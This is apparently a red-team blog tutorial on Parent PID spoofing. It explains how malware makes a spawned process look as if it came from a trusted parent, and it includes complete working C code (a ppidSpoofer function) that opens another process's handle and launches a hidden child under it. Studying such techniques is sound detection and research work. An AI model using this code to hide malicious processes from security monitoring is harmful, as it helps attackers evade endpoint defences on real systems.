---
description: Parent PID Spoofing
---

# PPID Spoofing

## Introduction

PPID Spoofing is a technique which is used by malwares to spoof their parent process, as if to show that they were spawned by a legitimate process. For eg. if a powershell is being spawned by office, this becomes really suspicious in contrast to powershell being spawned from explorer (this is same as you opening powershell from its location).  Vendors monitor the parent-child relationships between the processes to identify potential suspicious behavior. Below I have used process hacker to show how it is displayed.



<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption><p>Powershell being spawned interactively</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>powershell from a macro</p></figcaption></figure>

## Theory

So how does this work? Well you must be aware we can create a process using the CreateProcess api. While creating a process, it is possible to specify extended attributes by using the [**STARTUPINFOEX**](https://learn.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-startupinfoexa) structure. According to [MSDN](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)

> To set extended attributes, use a [STARTUPINFOEX](https://learn.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-startupinfoexa) structure and specify **EXTENDED\_STARTUPINFO\_PRESENT** in the _dwCreationFlags_ parameter.

We can initialize the `PROC_THREAD_ATTRIBUTE_LIST` using the [InitializeProcThreadAttributeList](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist) & then use [UpdateProcThreadAttribute](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute) api to update the value of `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to the handle to the parent process.&#x20;

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption><p>From winbase.h</p></figcaption></figure>

We can see different attributes defined here. For now, we just want the first one.&#x20;

## PPID Spoofing

Alright, First we have to get handle to the Parent Process. Since we would most probably be running as low privileged user, we need to look for a process accordingly. Since I just want to explain, I'll use flameshot (ss tool) instead as a parent process. First I need to get handle to it.

```c
hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwParentPID);
```

&#x20;Then I need to initialize the process attribute list and update it accordingly. But before that, [MSDN](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist) asks us to call this function with the count of attributes we want to set and then.

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

```c
InitializeProcThreadAttributeList(NULL, 1, NULL, &sz_tAttribList);
pThreadAttribList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz_tAttribList);
InitializeProcThreadAttributeList(pThreadAttribList, 1, NULL, &sz_tAttribList)
UpdateProcThreadAttribute(pThreadAttribList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)
si_ex.lpAttributeList = pThreadAttribList;
CreateProcessA(NULL, lpProcName, NULL, NULL, FALSE, (EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW), NULL, "C:\\Windows\\System32", &si_ex.StartupInfo, &pi)
```

After initializing it once, we get the size of attribute list, then we allocate heap memory for it and initialize it once again, after which we can update it and create the process. It is important to specify the `EXTENDED_STARTUPINFO_PRESENT` when we want to set the attributes.

Here's the full code

```c
BOOL ppidSpoofer(IN HANDLE hParent, IN LPCSTR lpProcName) {
    SIZE_T                             sz_tAttribList = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttribList = NULL;
    STARTUPINFOEXA                     si_ex = { 0 };
    PROCESS_INFORMATION                pi = { 0 };

    SecureZeroMemory(&si_ex, sizeof(STARTUPINFOEXA));
    SecureZeroMemory(&pi, sizeof(pi));

    InitializeProcThreadAttributeList(NULL, 1, NULL, &sz_tAttribList);
    DWORD err_122 = GetLastError();
    if (err_122 != ERROR_INSUFFICIENT_BUFFER) {
        warn("Initializing failed   @--=%d", err_122);
    }
    info("ThreadAttrib is of %d size , GOT ERROR  @--=%d", (int)sz_tAttribList, GetLastError());
    
    pThreadAttribList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz_tAttribList);
    if (pThreadAttribList == NULL) {
        warn("Error Allocating Heap  @--=0x%d", GetLastError());
        return FALSE;
    }

    if (!InitializeProcThreadAttributeList(pThreadAttribList, 1, NULL, &sz_tAttribList)) {
        warn("Initializing Attributes failed   @--=0x%d", GetLastError());
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(pThreadAttribList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
        warn("Updating Attributes failed   @--=0x%d", GetLastError());
        return FALSE;
    }

    si_ex.lpAttributeList = pThreadAttribList;

    if (!CreateProcessA(NULL, lpProcName, NULL, NULL, FALSE, (EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW), NULL, "C:\\Windows\\System32", &si_ex.StartupInfo, &pi)) {
        // I can change the current directory of the spawned process just by specifying where I want it to be ---------------- ^
        warn("Process Creation failed   @--=0x%d", GetLastError());
        return FALSE;
    }
    
    info("Created Process with id %d", pi.dwProcessId);
    CloseHandle(hParent);

    return TRUE;
}
```

After running this , we can see the process from process hacker.

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

And that's it for this time. It was a fairly small topic and a simple one. I do aim to talk about faking the process arguments next time. If you liked it, do let me know and drop a follow on [twitter](https://x.com/ZzN1NJ4).

## References

* [http://www.rohitab.com/discuss/topic/38601-proc-thread-attribute-list-structure-documentation/](http://www.rohitab.com/discuss/topic/38601-proc-thread-attribute-list-structure-documentation/)
* [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist)







